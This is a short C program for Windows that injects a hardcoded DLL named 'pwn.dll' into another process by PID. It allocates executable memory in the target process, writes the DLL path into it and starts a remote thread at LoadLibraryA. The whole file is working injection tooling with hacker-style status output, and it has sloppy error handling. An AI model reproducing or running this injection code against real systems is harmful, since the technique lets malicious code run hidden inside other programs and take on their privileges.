#include <stdio.h>
#include <windows.h>

int main(int argc, char* argv[])
{
	int pid = atoi(argv[1]);
	char pwn_dll_location[] = "C:\\Users\\ASNKK\\Downloads\\pwn.dll";
	size_t size = sizeof(pwn_dll_location) + 1;
	printf("[+] DLL Location: %s\n", pwn_dll_location);
	printf("[+] Size of the DLL: %d\n", size);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
	printf("[+] Creating Handle to the Target Process\n");
	if (!hProcess) {
		printf("Creating Handle Failed\n");
	}
	void* mem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] Allocating Memory at the Target Process\n");
	if (!mem) {
		printf("Memory Allocation to the Target Process Failed\n");
	}

	WriteProcessMemory(hProcess, mem, pwn_dll_location, size, NULL);
	printf("[+] Writing DLL Path into the Target Buffer\n");

	HMODULE hkernel_dll = GetModuleHandleA("kernel32.dll");
	printf("[+] kernel32.dll: 0x%p\n", hkernel_dll);
	if (!hkernel_dll) {
		printf("Module Handle Process Failed");
	}
	FARPROC address = GetProcAddress(hkernel_dll, "LoadLibraryA");
	printf("[+] Getting Address of LoadLibraryA\n");
	printf("[+] Address of LoadLibraryA: 0x%p\n", address);
	if (!address) {
		printf("Failed At Getting address of LoadLibraryA");
	}
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)address, mem, 0, NULL);
	printf("[+] Creating Threads at the Target Process\n");
	if (!hThread) {
		printf("");
	}
	printf("[+] Closing Handle\n");
	CloseHandle(hProcess);
	return 0;
	printf("[+] Operation DLL Injection Successful\n");
	printf("[+] Missing Accomplished\n");

}
